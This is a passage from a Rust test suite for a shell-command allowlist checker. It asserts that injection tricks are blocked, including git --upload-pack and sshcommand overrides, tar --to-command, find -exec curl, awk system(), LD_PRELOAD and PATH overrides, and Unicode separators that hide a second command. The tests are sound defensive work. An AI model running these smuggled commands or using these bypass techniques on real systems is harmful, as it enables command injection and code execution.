        let result = check_all_segments("perl -pe 's/foo/bar/'", &list);
        assert!(result.is_err(), "perl -pe must be blocked (combined flag)");
    }

    #[test]
    fn combined_flags_ne_blocked() {
        let list = allow(&["perl"]);
        let result = check_all_segments("perl -ne 'print'", &list);
        assert!(result.is_err(), "perl -ne must be blocked (combined flag)");
    }

    #[test]
    fn heredoc_to_interpreter_blocked() {
        let list = allow(&["python3"]);
        let result = check_all_segments("python3 <<'EOF'", &list);
        assert!(result.is_err(), "heredoc to interpreter must be blocked");
    }

    #[test]
    fn python_script_file_still_allowed() {
        let list = allow(&["python3"]);
        assert!(check_all_segments("python3 script.py", &list).is_ok());
        assert!(check_all_segments("python3 -u script.py", &list).is_ok());
    }

    #[test]
    fn bare_interpreter_detection() {
        assert!(is_bare_interpreter_stdin("python3"));
        assert!(is_bare_interpreter_stdin("python3 -u"));
        assert!(!is_bare_interpreter_stdin("python3 script.py"));
        assert!(!is_bare_interpreter_stdin("python3 -u script.py"));
    }

    // --- Phase 1 V2: WARN-FIRST checks (default = command passes through) ---

    #[test]
    fn dollar_paren_in_args_passes_by_default() {
        let list = allow(&["echo", "git", "cat"]);
        assert!(
            check_all_segments("echo $(whoami)", &list).is_ok(),
            "$() in args must still pass when shell_strict_mode=false (default)"
        );
    }

    #[test]
    fn backticks_in_args_passes_by_default() {
        let list = allow(&["echo"]);
        assert!(
            check_all_segments("echo `date`", &list).is_ok(),
            "backticks in args must still pass when shell_strict_mode=false"
        );
    }

    #[test]
    fn git_commit_with_subst_passes_by_default() {
        let list = allow(&["git", "cat"]);
        assert!(
            check_all_segments(
                "git commit -m \"$(cat <<'EOF'\nfix: something\nEOF\n)\"",
                &list,
            )
            .is_ok(),
            "git commit with $() must still pass (regression test)"
        );
    }

    // --- Empty allowlist + unconditional blocked ---

    // --- Phase 6: Dangerous flag detection ---

    #[test]
    fn git_status_allowed() {
        let list = allow(&["git"]);
        assert!(check_all_segments("git status", &list).is_ok());
    }

    #[test]
    fn git_upload_pack_blocked() {
        let list = allow(&["git"]);
        let result = check_all_segments("git --upload-pack=\"evil\" clone repo", &list);
        assert!(result.is_err(), "git --upload-pack must be blocked");
    }

    #[test]
    fn git_config_sshcommand_blocked() {
        let list = allow(&["git"]);
        let result = check_all_segments("git --config=core.sshcommand=\"evil\" clone repo", &list);
        assert!(
            result.is_err(),
            "git --config=core.sshcommand must be blocked"
        );
    }

    #[test]
    fn tar_extract_allowed() {
        let list = allow(&["tar"]);
        assert!(check_all_segments("tar xf archive.tar", &list).is_ok());
    }

    #[test]
    fn tar_to_command_blocked() {
        let list = allow(&["tar"]);
        let result = check_all_segments("tar xf a.tar --to-command=evil", &list);
        assert!(result.is_err(), "tar --to-command must be blocked");
    }

    #[test]
    fn find_name_allowed() {
        let list = allow(&["find"]);
        assert!(check_all_segments("find . -name \"*.rs\"", &list).is_ok());
    }

    #[test]
    fn find_exec_blocked() {
        let list = allow(&["find"]);
        let result = check_all_segments("find . -exec curl evil \\;", &list);
        assert!(result.is_err(), "find -exec must be blocked");
    }

    #[test]
    fn awk_system_blocked() {
        let list = allow(&["awk"]);
        let result = check_all_segments("awk '{system(\"id\")}'", &list);
        assert!(result.is_err(), "awk system() must be blocked");
    }

    #[test]
    fn awk_normal_allowed() {
        let list = allow(&["awk"]);
        assert!(check_all_segments("awk '{print $1}'", &list).is_ok());
    }

    #[test]
    fn inline_path_env_blocked() {
        let list = allow(&["git"]);
        let result = check_all_segments("PATH=/tmp/evil git status", &list);
        assert!(result.is_err(), "PATH= inline env must be blocked");
    }

    #[test]
    fn inline_ld_preload_blocked() {
        let list = allow(&["ls"]);
        let result = check_all_segments("LD_PRELOAD=/tmp/evil.so ls", &list);
        assert!(result.is_err(), "LD_PRELOAD= inline env must be blocked");
    }

    #[test]
    fn echo_path_in_quotes_allowed() {
        let list = allow(&["echo"]);
        assert!(
            check_all_segments("echo \"PATH=test\"", &list).is_ok(),
            "PATH inside quotes is not an inline env assignment"
        );
    }

    // --- Empty allowlist + unconditional blocked ---

    #[test]
    fn empty_allowlist_blocks_dot_source() {
        let result = check_shell_allowlist(". /tmp/evil.sh");
        assert!(
            result.is_err(),
            ". must be blocked even with empty allowlist"
        );
    }

    #[test]
    fn unicode_line_separators_normalized() {
        let normalized = normalize_line_continuations("echo ok\u{2028}curl evil");
        assert!(
            normalized.contains('\n'),
            "U+2028 must be normalized to newline"
        );
    }

    #[test]
    fn unicode_paragraph_separator_normalized() {
        let normalized = normalize_line_continuations("echo ok\u{2029}curl evil");
        assert!(
            normalized.contains('\n'),
            "U+2029 must be normalized to newline"
        );
    }

    #[test]
    fn empty_allowlist_blocks_exec() {
        let result = check_shell_allowlist("exec /bin/sh");
        // exec is in has_dangerous_patterns or check_unconditional_blocked_only
        // With empty allowlist, check_unconditional_blocked_only catches it
        // Actually exec at command start is not caught by has_dangerous_patterns
        // but by check_unconditional_blocked_only
        assert!(
            result.is_err(),
            "exec must be blocked even with empty allowlist"
        );
    }
}
